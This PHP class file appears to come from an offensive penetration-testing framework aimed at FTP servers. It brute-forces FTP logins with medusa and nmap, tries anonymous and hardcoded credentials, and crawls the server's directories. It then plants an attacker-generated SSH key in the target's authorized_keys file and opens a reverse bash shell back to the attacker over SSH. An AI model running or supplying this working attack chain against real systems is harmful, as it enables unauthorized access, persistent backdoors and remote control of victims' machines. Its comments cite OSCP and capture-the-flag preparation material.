<?php


class service2ftp extends SERVICE {


    public function __construct($eth,$domain,$ip,$port,$service_protocol,$service_name,$service_version,$service_product,$service_extrainfo,$service_hostname,$service_conf) {
        parent::__construct($eth,$domain,$ip,$port,$service_protocol,$service_name,$service_version,$service_product,$service_extrainfo,$service_hostname,$service_conf);
    }

    // From ftp > !/bin/sh -c  or !/bin/bash
    // https://www.jpsecnetworks.com/week-8-oscp-preparation-post-exploitation/
    // https://codemonkeyism.co.uk/post-exploitation-file-transfers/
    // http://devloop.users.sourceforge.net/index.php?article151/solution-du-ctf-c0m80-1-de-vulnhub
    
    public function service2ftp4exec(){
        $result = "";

        $this->titre(__FUNCTION__);
        
        return $this->ftp2pentest("matt", "cheese");
        
           $user2name = "user_doesnt_exist";
            $user2pass = "pass_doesnt_exist" ; 
            $query_medusa = "medusa -u \"$user2name\" -p \"$user2pass\" -h '$this->ip' -M ftp -f -t 1 -e s -n $this->port  2>/dev/null | grep '\[SUCCESS\]' ";
            if (!empty($this->req_ret_str($query_medusa))) {
                $result .=  $this->auth2login_ftp4exec($user2name, $user2pass, "help");
                $result .=  $this->auth2login_ftp4exec($user2name, $user2pass, "PWD");
                $result .=  $this->auth2login_ftp4exec($user2name, $user2pass, "ls -al");
                return $result;
            }
            
            $this->pause();
            
            $user2name = "anonymous";
            $user2pass = "" ;
            $query_medusa = "medusa -u \"$user2name\" -p \"$user2pass\" -h '$this->ip' -M ftp -f -t 1 -e s -n $this->port  2>/dev/null | grep '\[SUCCESS\]' ";
            if (!empty($this->req_ret_str($query_medusa))) {
                $this->port2auth4pass4medusa("ftp",$user2name,$user2pass);
                $result .=  $this->auth2login_ftp4exec($user2name, $user2pass, "help");
                $result .=  $this->auth2login_ftp4exec($user2name, $user2pass, "PWD");
                $result .=  $this->auth2login_ftp4exec($user2name, $user2pass, "ls -al");

            }
            
            
            
            $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"ftp-brute.nse\" --script-args userdb=$this->dico_users $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
            $result .= $this->cmd("localhost",$query);
            //$result .= $this->auth2login4nmap($this->req_ret_str($query),"FTP nmap Brute");
            //$xml = file_get_contents("$this->dir_tmp/nmap.ftp.xml");$result .= $this->auth2login4nmap($xml,"FTP nmap Brute");
            
            $this->pause();

            
            $tab_users_shell = $this->ip2users();
            if(!empty($tab_users_shell))
            foreach ($tab_users_shell as $user2name_shell){
                $result .= $this->article("USER FOUND FOR TEST", "$user2name_shell");
                $result .= $this->port2auth4dico4medusa("ftp",$user2name_shell);
            }
                        
            
            $users_passwd = $this->ip2users4passwd();
            foreach ($users_passwd as $user2name => $user2pass){
                if (!empty($user2name)){
                    $check = $this->auth2login_ftp4exec($user2name, $user2pass, "help");
                    $this->ftp2pentest($user2name, $user2pass);
                    
                }
            }
            

            
            return $result;
        
    }
    
    
    public function service4authorized_keys4ftp($ftp_stream, $remote_username_ftp, $remote_userpass_ftp){
        $this->ssTitre(__FUNCTION__);
        $result = "";

        
        $remote_authorized_keys_filepath = "";
        $public_authorized_keys_str2use = "";
        //$remote_username_ftp  $remote_userpass_ftp, $remote_username2use, $racine_ftp
        
        $tab_dir = $this->stream8ftp2dir($ftp_stream);
        $str_dir = $this->tab($tab_dir);
        $this->pause();
        $this->ssTitre("Searching authorized_keys");
        $tab_files = $this->stream8ftp2files($ftp_stream);
        $str_files = $this->tab($tab_files);
        
        $this->pause();
        $remote_authorized_keys_filepath = $this->ftp2search4path($tab_files, "authorized_keys");
        $this->article("PATH authorized_keys", $remote_authorized_keys_filepath);
        $this->pause();
        
        $racine_ftp = ftp_pwd($ftp_stream);
        
        $private_key_ssh_rsa_file = "$this->dir_tmp/$this->ip.$remote_username_ftp.rsa.priv";
        $obj_file = new FILE($private_key_ssh_rsa_file);
        $public_key_ssh_rsa_file = "$obj_file->file_dir/$obj_file->file_name.pub";
        $private_key_passwd = '';
        $private_keys_str = $this->key2gen4priv("",10,$private_key_ssh_rsa_file, $public_key_ssh_rsa_file);
        $public_authorized_keys_str2use = $this->key2gen4public("",10, $private_key_ssh_rsa_file, $public_key_ssh_rsa_file, $private_key_passwd);
        
        $this->pause();
        
        if (empty($remote_authorized_keys_filepath)){
            
            ftp_mkdir($ftp_stream, "$racine_ftp.ssh");

            $ftp_rawlist_racine = ftp_rawlist($ftp_stream,"-a");
        echo $this->tab($ftp_rawlist_racine);
        
        $tmp = ftp_rawlist($ftp_stream, "$racine_ftp",TRUE);
            if (!$tmp) echo $tmp ;
            
            $query = "cat $public_key_ssh_rsa_file > /tmp/authorized_keys";
            $this->requette($query);
            ftp_put($ftp_stream, "$racine_ftp.ssh/authorized_keys", "/tmp/authorized_keys", FTP_ASCII);
            
            
            var_dump(ftp_rawlist($ftp_stream, "$racine_ftp.ssh/",TRUE));
            if (!$tmp) echo $tmp ;

            ftp_chdir($ftp_stream,"$racine_ftp.ssh/");
            $ftp_rawlist_racine = ftp_rawlist($ftp_stream,"-a");
            $files_list_str = $this->tab($ftp_rawlist_racine);
            echo $files_list_str;
            
            if (strstr($files_list_str, "authorized_keys")!==FALSE) $remote_authorized_keys_filepath = "$racine_ftp/.ssh/authorized_keys";

            $this->pause();
            
            ftp_chdir($ftp_stream,"$racine_ftp");
        }
        
        if (!empty($remote_authorized_keys_filepath)){
            
            ftp_get($ftp_stream, "/tmp/authorized_keys_get", "$racine_ftp.ssh/authorized_keys", FTP_ASCII);
            
            $query = "cat /tmp/authorized_keys_get";
            $public_keys_found = trim($this->req_ret_str($query));
            $this->pause();
            
            
            if(stristr($public_authorized_keys_str2use,$public_keys_found)!==FALSE) {
                $this->log2succes("FOUND Public key - already exist",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"$public_authorized_keys_str2use","");
                echo "Public key already exist\n";
                $result .= "Public key already exist\n";
            }
            else {
                $chaine = "Public key added\n";
                $this->note($chaine);
                $query = " echo '$public_keys_found' | tee -a /tmp/authorized_keys_get";
                $this->req_ret_str($query);
                
            }
            $this->pause();
            
            // ftp_site($conn, 'CHMOD 0600 /home/user/privatefile')
            
            $ssh_open = $this->ip2port4service("ssh");
            if(!empty($ssh_open)) {
                $stream = $this->stream8ssh2key8priv4file($this->ip, $ssh_open, $remote_username_ftp, $private_key_ssh_rsa_file,$private_key_passwd);
                if(is_resource($stream)){
                    $info = "SSH Private Key:$private_key_ssh_rsa_file";
                    $this->log2succes($info, __FILE__, __CLASS__, __FUNCTION__, __LINE__, $info, "");
                    $template_shell = "ssh -i $private_key_ssh_rsa_file -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $remote_username_ftp@$this->ip -p $ssh_open -C  \"%SHELL%\" ";
                    $templateB64_shell = base64_encode($template_shell);
                    $attacker_ip = $this->ip4addr4target($this->ip);
                    $attacker_port = rand(1024,65535);
                    $shell = "/bin/bash";
                    $cmd_rev  = $this->rev8sh($attacker_ip, $attacker_port, $shell);
                    $cmd = str_replace("%SHELL%", $cmd_rev, $template_shell);
                    $lport = $ssh_open;
                    $lprotocol = 'T' ;
                    $type = "server";
                    $this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
                }
            }
            
        }
        $this->pause();
        
        return $result;
    }
    
    public function ftp2search4path($tab_path,$search){        
        $search = trim($search);
        $this->ssTitre("Searching $search");
        $file_path = "";
        foreach ($tab_path as $file){
            $file = trim($file);
            if (!empty($file)){
                if (strstr($file,$search)!==FALSE)  {
                    $file_path = $file;
                    return $file_path;
                }
            }
        }
        return $file_path;
    }

    
    
    
    public function ftp2pentest( $remote_username_ftp, $remote_userpass_ftp){
        $this->titre(__FUNCTION__); 
        $result = "";

         
        $ftp_stream = @ftp_connect($this->ip,$this->port) ;
        echo ftp_systype($ftp_stream);
        
        if(@ftp_login($ftp_stream, $remote_username_ftp, $remote_userpass_ftp)){
            echo ftp_systype($ftp_stream);
            
            $result .= $this->service4authorized_keys4ftp($ftp_stream, $remote_username_ftp, $remote_userpass_ftp);
            $this->pause();
            
            echo $result;
        }
        ftp_close($ftp_stream);
        return $result;
    }
    
    public function stream8ftp2files($ftp_stream){
        $this->ssTitre(__FUNCTION__);
        $tab_files_path = array();

        

        $base = ftp_pwd($ftp_stream);
        $this->article("PWD FTP", $base);
       
        $ftp_rawlist_racine = ftp_rawlist($ftp_stream,"-a");
        //var_dump($ftp_rawlist_racine);
        foreach ($ftp_rawlist_racine as $v) {
            $info = array();
            $vinfo = preg_split("/[\s]+/", $v, 9);
            if ($vinfo[0] !== "total") {
                $info['chmod'] = $vinfo[0];
                $info['num'] = $vinfo[1];
                $info['owner'] = $vinfo[2];
                $info['group'] = $vinfo[3];
                $info['size'] = $vinfo[4];
                $info['month'] = $vinfo[5];
                $info['day'] = $vinfo[6];
                $info['time'] = $vinfo[7];
                $info['name'] = $vinfo[8];
                $info['path'] = $base.$vinfo[8];
                $rawlist[$info['name']] = $info;
            }
        }
        $dir = array();
        $file = array();
        foreach ($rawlist as $k => $v) {
            if ($v['chmod']{0} == "d") {
                $dir[$k] = $v;
            } elseif ($v['chmod']{0} == "-") {
                $file[$k] = $v;
            }
        }
        
        foreach ($dir as $dirname => $dirinfo) {
            echo "[ $dirname ] " . $dirinfo['chmod'] . " | " . $dirinfo['owner'] . " | " . $dirinfo['group'] . " | " . $dirinfo['month'] . " " . $dirinfo['day'] . " " . $dirinfo['time'] . "\n";
            if ($dirname!=="." && $dirname!==".." ){
                ftp_chdir($ftp_stream, $dirname);
                $ftp_rawlist_dir = ftp_rawlist($ftp_stream,"-a");
            echo $this->tab($ftp_rawlist_dir);
            foreach ($ftp_rawlist_dir as $v) {
                $info = array();
                $vinfo = preg_split("/[\s]+/", $v, 9);
                if ($vinfo[0] !== "total") {
                    $info['chmod'] = $vinfo[0];
                    $info['num'] = $vinfo[1];
                    $info['owner'] = $vinfo[2];
                    $info['group'] = $vinfo[3];
                    $info['size'] = $vinfo[4];
                    $info['month'] = $vinfo[5];
                    $info['day'] = $vinfo[6];
                    $info['time'] = $vinfo[7];
                    $info['name'] = $vinfo[8];
                    $info['path'] = "$base$dirname/".$vinfo[8];
                    $rawlist[$info['name']] = $info;
                }
            }
            
            //var_dump($rawlist);
            foreach ($rawlist as $k => $v) {
                if ($v['chmod']{0} == "-") {
                    $file[$k] = $v;
                }
            }
            
            ftp_chdir($ftp_stream, $base);
            }
        }

        foreach ($file as $filename => $fileinfo) {
            //echo "$filename " . $fileinfo['chmod'] . " | " . $fileinfo['owner'] . " | " . $fileinfo['group'] . " | " . $fileinfo['size'] . " Byte | " . $fileinfo['month'] . " " . $fileinfo['day'] . " " . $fileinfo['time'] . "\n";
            $this->article($fileinfo['path'], $fileinfo['size']." Byte ");
            $tab_files_path[] = $fileinfo['path'];
        }
        
        
        

        
    
        return $tab_files_path;

    }
    

    
    
    public function stream8ftp2dir($ftp_stream){
        $this->ssTitre(__FUNCTION__);
        

        $tab_dir_path = array();
        

        $base = ftp_pwd($ftp_stream);
        $this->article("PWD FTP", $base);
        
        $ftp_rawlist_racine = ftp_rawlist($ftp_stream,"-a");
        //var_dump($ftp_rawlist_racine);
        foreach ($ftp_rawlist_racine as $v) {
            $info = array();
            $vinfo = preg_split("/[\s]+/", $v, 9);
            if ($vinfo[0] !== "total") {
                $info['chmod'] = $vinfo[0];
                $info['num'] = $vinfo[1];
                $info['owner'] = $vinfo[2];
                $info['group'] = $vinfo[3];
                $info['size'] = $vinfo[4];
                $info['month'] = $vinfo[5];
                $info['day'] = $vinfo[6];
                $info['time'] = $vinfo[7];
                $info['name'] = $vinfo[8];
                $info['path'] = $base.$vinfo[8];
                $rawlist[$info['name']] = $info;
            }
        }
        $dir = array();

        foreach ($rawlist as $k => $v) {
            if ($v['chmod']{0} == "d") {
                $dir[$k] = $v;
            } 
        }
        
        foreach ($dir as $dirname => $dirinfo) {
            echo "[ $dirname ] " . $dirinfo['chmod'] . " | " . $dirinfo['owner'] . " | " . $dirinfo['group'] . " | " . $dirinfo['month'] . " " . $dirinfo['day'] . " " . $dirinfo['time'] . "\n";
            if ($dirname!=="." && $dirname!==".." && !empty($dirname) ){
                $tab_dir_path[] = $dirname;
                $this->article("dir test", $dirname);
                ftp_chdir($ftp_stream,  "$base$dirname");
                $ftp_rawlist_dir = ftp_rawlist($ftp_stream,"-a");
                echo $this->tab($ftp_rawlist_dir);
                foreach ($ftp_rawlist_dir as $v) {
                    $info = array();
                    $vinfo = preg_split("/[\s]+/", $v, 9);
                    if ($vinfo[0] !== "total") {
                        $info['chmod'] = $vinfo[0];
                        $info['num'] = $vinfo[1];
                        $info['owner'] = $vinfo[2];
                        $info['group'] = $vinfo[3];
                        $info['size'] = $vinfo[4];
                        $info['month'] = $vinfo[5];
                        $info['day'] = $vinfo[6];
                        $info['time'] = $vinfo[7];
                        $info['name'] = $vinfo[8];
                        $info['path'] = "$base$dirname/".$vinfo[8];
                        $rawlist[$info['name']] = $info;
                    }
                }
                

            }
        }
        
      
        ftp_chdir($ftp_stream, $base);
        return $tab_dir_path;
        
    }
    
    
    
    
    
    
    
    
    
    
    
  }
?>
